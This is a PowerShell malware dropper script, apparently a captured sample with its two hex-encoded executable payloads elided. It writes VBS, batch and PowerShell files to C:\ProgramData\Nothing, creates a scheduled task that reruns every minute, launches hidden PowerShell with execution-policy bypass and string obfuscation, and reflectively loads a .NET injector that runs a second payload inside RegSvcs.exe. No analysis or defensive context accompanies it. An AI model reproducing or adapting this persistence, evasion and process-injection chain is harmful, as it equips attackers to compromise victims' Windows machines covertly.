$a = "C:\ProgramData\Nothing"
New-Item $a -ItemType Directory -Force
Sleep 1
$Content = @'
try 
{
&'schtasks.exe' '/create' '/sc' 'minute' '/mo' 1 '/tn' 'Nothing' '/tr' (('C:\ProgramData\Nothing\Nothing.vbs'));
} catch { }
'@
[IO.File]::WriteAllText("C:\ProgramData\Nothing\x.ps1", $Content)
$Content = @'
on error resume next
WScript.Sleep 10000
set A = CreateObject("WScript.Shell")
A.run "C:\ProgramData\Nothing\1.bat",0
'@
[IO.File]::WriteAllText("C:\ProgramData\Nothing\Nothing.vbs", $Content)
$Content = @'
SET !A=E
CMD /C POW%!A%RSHELL -NOP -WIND HIDDEN -eXEC BYPASS -NONI "C:\ProgramData\Nothing\Nothing.ps1"
'@
[IO.File]::WriteAllText("C:\ProgramData\Nothing\1.bat", $Content)
$Content = @'
Try{
function xxx {
param($app1)$app1 = $app1 -split '(..)' | ? { $_ }
ForEach ($UX2 in $app1)
{
[Convert]::ToInt32($UX2,16)
}
}
[Byte[]] $xxx = xxx $code
[byte[]] $apprun  = xxx('4D5A9...000')  # The omitted '4D5A9...000' is actually a 95233 character long string.
}catch{}
Try{
[byte[]] $appme  = xxx '4D5A9...000'  # The omitted '4D5A9...000' is actually a 135169 character long string.
$RLD = 'Get'
$EYJ = $RLD + 'Method'
$RUK = 'Invoke'
$RLD = $RLD + 'Type'
$KST = 'Load'
$USW = [Reflection.Assembly]
$KSW = $USW::$KST($apprun)
$KSW = $KSW.$RLD('NewPE2.PE')
$KSW = $KSW.$EYJ('Execute')
$EYJn = 'C:\Windows\Mic'
$WNA = $EYJn + 'rosoft.NET\Fr'
$KRE = $WNA + 'amework\v4.0'
$KRW = $KRE + '.30319\'
$XQ = $KRW + 'RegSvcs.exe'
}catch{}
return $KSW = $KSW.$RUK($null,[object[]] ($XQ,$appme));
'@
[IO.File]::WriteAllText("C:\ProgramData\Nothing\Nothing.ps1", $Content)
Start-Sleep 10
I`E`X([IO.File]::ReadAllText('C:\ProgramData\Nothing\x.ps1'))
